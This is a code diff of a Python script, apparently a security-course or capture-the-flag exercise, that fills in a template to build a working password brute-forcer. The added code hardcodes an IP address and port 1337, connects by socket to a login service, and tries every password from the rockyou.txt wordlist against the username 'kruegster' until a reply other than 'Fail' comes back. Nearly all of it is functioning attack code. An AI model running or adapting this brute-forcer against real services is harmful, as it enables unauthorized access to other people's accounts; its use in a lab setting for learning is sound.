@@ -26,11 +26,14 @@
 
 import socket
 
-host = "" # IP address here
-port = 0000 # Port here
+#host = "" # IP address here
+#port = 0000 # Port here
+host = "142.93.117.193"
+port = 1337
+
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
-def brute_force():
+def brute_force(in_username, in_password, count):
     """
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
@@ -55,11 +58,60 @@ def brute_force():
             the Briong server.
     """
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
 
+    first_data = s.recv(1024)
+    username = in_username + "\n"
 
+    print("Response1: " + str(first_data) + " " + str(username), end='')
 
+    s.send(username.encode())
+
+    second_data = s.recv(1024)
+    password = in_password + "\n"
+
+    print("Response2: " + str(second_data) + " " + str(password), end='')
+
+    s.send(password.encode())
+
+    third_data = s.recv(1024)
+    print("Reponse3: " + repr(str(third_data)))
+
+    is_pass = 0
+
+    if(str(third_data) == "b'Fail\\n'"):
+        print("Failure " + str(count))
+    else:
+        is_pass = 1
+        print("Success on attempt " + str(count))
+
+    print("=============================")
+
+    s.close()
+
+    return is_pass
 
 if __name__ == '__main__':
-    brute_force()
+    #brute_force("kruegster1990", "test_password")
+    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #s.connect((host, port))
+
+    attempt_counter = 0
+
+    with open(wordlist) as fp:
+        line = fp.readline()
+        cnt = 1
+        while line:
+            is_pass = 0
+            if (cnt > -1):
+                is_pass = brute_force("kruegster", str(line.strip()), cnt)
+            	#is_pass = brute_force("kruegster1990", str(line.strip()), cnt)
+            else:
+                is_pass = 0
+                print("Skipped: " + str(cnt))
+            #print("Line {}: {}".format(cnt, line.strip()))
+            line = fp.readline()
+            cnt += 1
+            if is_pass == 1:
+            	break
